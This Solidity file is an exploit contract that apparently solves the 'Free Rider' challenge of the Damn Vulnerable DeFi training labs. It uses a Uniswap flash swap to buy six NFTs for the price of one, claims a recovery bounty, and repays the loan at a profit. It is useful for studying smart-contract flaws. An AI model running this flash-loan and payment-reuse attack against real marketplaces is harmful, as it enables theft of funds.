// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {FreeRiderNFTMarketplace} from "../../src/free-rider/FreeRiderNFTMarketplace.sol";
import {FreeRiderRecoveryManager} from "../../src/free-rider/FreeRiderRecoveryManager.sol";
import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import {Address} from "@openzeppelin/contracts/utils/Address.sol";
import {console} from "forge-std/Test.sol";

contract Exploit is IERC721Receiver {
    using Address for address payable;

    WETH public immutable weth;
    IUniswapV2Pair public immutable pair;
    FreeRiderNFTMarketplace public immutable marketplace;
    DamnValuableNFT public immutable nft;
    FreeRiderRecoveryManager public immutable recoveryManager;
    address public immutable player;
    uint256 public immutable NFT_PRICE = 15 ether;

    constructor(
        address _weth,
        address _pair,
        address _marketplace,
        address _recoveryManager,
        address _nft,
        address _player
    ) {
        weth = WETH(payable(_weth));
        pair = IUniswapV2Pair(_pair);
        marketplace = FreeRiderNFTMarketplace(payable(_marketplace));
        recoveryManager = FreeRiderRecoveryManager(_recoveryManager);
        nft = DamnValuableNFT(_nft);
        player = _player;
    }

    function pwn() external {
        // Trigger flash swap of 15 ETH worth of WETH
        bytes memory data = abi.encode(address(weth), NFT_PRICE);
        pair.swap(NFT_PRICE, 0, address(this), data);
    }

    function uniswapV2Call(address, uint, uint, bytes calldata) external {
        // weth.balanceOf(address(this));

        // 1. Receive 15 WETH and unwrap
        weth.withdraw(NFT_PRICE);

        // 2. Buy all NFTs (IDs 0â€“5) from the marketplace
        uint256[] memory ids = new uint256[](6);
        for (uint256 i = 0; i < 6; i++) {
            ids[i] = i;
        }
        marketplace.buyMany{value: NFT_PRICE}(ids);

        // 3. Transfer NFTs to the recovery manager to trigger bounty
        for (uint256 i = 0; i < 6; i++) {
            nft.safeTransferFrom(address(this), address(recoveryManager), i, abi.encode(address(this)));
        }

        // 4. Receive bounty (45 ETH), rewrap to WETH and repay loan + fee
        uint256 fee = ((NFT_PRICE * 3) / 997) + 1;
        weth.deposit{value: NFT_PRICE + fee}();
        weth.transfer(address(pair), NFT_PRICE + fee);

        // 5. Send leftover ETH to player
        payable(player).sendValue(address(this).balance);
    }

    receive() external payable {}

    function onERC721Received(address, address, uint256, bytes calldata) external pure override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }
}
